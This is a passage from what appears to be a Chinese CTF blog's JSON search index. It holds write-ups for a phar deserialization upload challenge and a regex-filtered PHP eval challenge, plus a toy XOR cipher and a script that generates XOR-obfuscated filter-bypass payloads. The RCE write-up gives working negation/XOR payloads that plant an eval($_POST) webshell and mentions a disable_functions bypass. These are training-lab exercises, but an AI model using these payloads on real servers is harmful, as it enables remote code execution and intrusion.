Phar(\u0026#34;mm.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;\u0026lt;?php __HALT_COMPILER(); ? \u0026gt;\u0026#39;); $phar-\u0026gt;setMetadata($c); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); // 生成签名 $phar-\u0026gt;stopBuffering(); function.php限制上传的文件后缀，但是到最后都会被命名为xxxxxx.jpg文件。mm.phar改成png结尾，\n上传文件，然后利用phar伪协议http://xxxxx/file.php?file=phar://upload/xxxx.jpg\n","date":"2022-08-04T00:00:00Z","image":"http://main1o.github.io/luck.png","permalink":"http://main1o.github.io/p/swpuctf_2018_simplephp/","title":"SWPUCTF_2018_SimplePHP"},{"content":"对称加密 encode:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #!/usr/bin/env python # -*- coding: utf-8 -*- def encode(ciphertext): flag = \u0026#39;*************\u0026#39; ciphertext = [] for i in range(len(flag)): s = chr(i ^ ord(flag[i])) if i % 2 == 0: s = ord(s) + 10 else: s = ord(s) - 10 ciphertext.append(str(s)) return ciphertext[::-1] ciphertext = [ # 24 \u0026#39;96\u0026#39;, \u0026#39;65\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;123\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;102\u0026#39;, \u0026#39;94\u0026#39;, \u0026#39;132\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;112\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;80\u0026#39;, \u0026#39;82\u0026#39;, \u0026#39;137\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;109\u0026#39;, \u0026#39;99\u0026#39;, \u0026#39;112\u0026#39;] decode:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 #!/usr/bin/env python # -*- coding: utf-8 -*- def decode(ciphertext): flag = \u0026#39;\u0026#39; ciphertext.reverse() for i in range(len(ciphertext)): if i % 2 == 0: s = int(ciphertext[i])-10 else: s = int(ciphertext[i])+10 flag += chr(i^s) return flag ciphertext = [ \u0026#39;96\u0026#39;, \u0026#39;65\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;123\u0026#39;, \u0026#39;91\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;93\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;102\u0026#39;, \u0026#39;94\u0026#39;, \u0026#39;132\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;112\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;88\u0026#39;, \u0026#39;80\u0026#39;, \u0026#39;82\u0026#39;, \u0026#39;137\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;109\u0026#39;, \u0026#39;99\u0026#39;, \u0026#39;112\u0026#39;] if __name__ == \u0026#39;__main__\u0026#39;: f = decode(ciphertext) print(f) ","date":"2022-06-24T00:00:00Z","image":"http://main1o.github.io/103365922_p0.png","permalink":"http://main1o.github.io/p/encrypt/","title":"encrypt"},{"content":"xorScript Demo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 #!/usr/bin/env python # -*- coding: utf-8 -*- import sys import string import urllib def help(): print(\u0026#34;1.数字异或\u0026#34;) print(\u0026#34;2.所有标点集异或\u0026#34;) def XOR_1(): payload = input(\u0026#34;payload:\u0026#34;) strlist = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, \\ 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, \\ 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127] # strlist是ascii表中所有非字母数字的字符十进制 str1,str2 = \u0026#39;\u0026#39;,\u0026#39;\u0026#39; for char in payload: for i in strlist: for j in strlist: if(i ^ j == ord(char)): i = \u0026#39;%{:0\u0026gt;2}\u0026#39;.format(hex(i)[2:]) j = \u0026#39;%{:0\u0026gt;2}\u0026#39;.format(hex(j)[2:]) print(\u0026#34;(\u0026#39;{0}\u0026#39;^\u0026#39;{1}\u0026#39;)\u0026#34;.format(i,j),end=\u0026#34;.\u0026#34;) break else: continue break def XOR_2(): char = string.printable # 返回所有标点集，数字，ascii_letters和空格 # 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\u0026#39;()*+, -./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~ payload = input(\u0026#34;payload:\u0026#34;) tmp1,tmp2 = \u0026#39;\u0026#39;,\u0026#39;\u0026#39; for res in payload: for i in char: for j in char: if(ord(i)^ord(j) == ord(res)): tmp1 += i tmp2 += j break else: continue break print(\u0026#34;(\u0026#39;{}\u0026#39;^\u0026#39;{}\u0026#39;)\u0026#34;.format(tmp1,tmp2)) if \u0026#34;__main__\u0026#34; == __name__: def demo(argv): if len(argv)\u0026lt;1: help() sys.exit() try: if(sys.argv[1] == \u0026#34;1\u0026#34;): XOR_1() elif(sys.argv[1] == \u0026#34;2\u0026#34;): XOR_2() else: pass except: sys.exit() demo(sys.argv[1:]) ","date":"2022-06-24T00:00:00Z","image":"http://main1o.github.io/wallhaven-6o6orw_1920x1080.png","permalink":"http://main1o.github.io/p/xor/","title":"xor"},{"content":"[极客大挑战 2019]RCE ME 在线环境BUUCTF搜索\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;code\u0026#39;])){ $code=$_GET[\u0026#39;code\u0026#39;]; if(strlen($code)\u0026gt;40){ die(\u0026#34;This is too Long.\u0026#34;); } if(preg_match(\u0026#34;/[A-Za-z0-9]+/\u0026#34;,$code)){ die(\u0026#34;NO.\u0026#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?\u0026gt; 分析代码知道传入的值不能是A-Z,a-z,0-9并且不能大于40个字符\n1 2 3 4 ?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();\u0026amp;%ff=phpinfo // 这里进行异或绕过了 // 被解析为：${_GET}{%ff}();\u0026amp;%ff=phpinfo\t再次构建payload\n1 2 3 4 5 6 7 8 9 \u0026lt;?php error_reporting(0); $a=\u0026#39;assert\u0026#39;; $b=urlencode(~$a); echo $b; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $c=\u0026#39;(eval($_POST[a]))\u0026#39;; $d=urlencode(~$c); echo $d; 1 2 3 4 5 6 7 %9E%8C%8C%9A%8D%8B %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6 // 传值得取反 code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); 用web工具连接，蚁剑 在之前的phpinfo能看到很多函数被禁用了，蚁剑不能调用终端，所以得开代理下载一个蚁剑插件，在插件市场里，下载disable_functions的插件 然后在webshell连接页面，启用插件，选择模式 PHP7的UAF\n在根目录看见readflag，运行的得到flag～\n","date":"2021-09-09T00:00:00Z","image":"http://main1o.github.io/image83.png","permalink":"http://main1o.github.io/p/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/","title":"2019极客大挑战"}]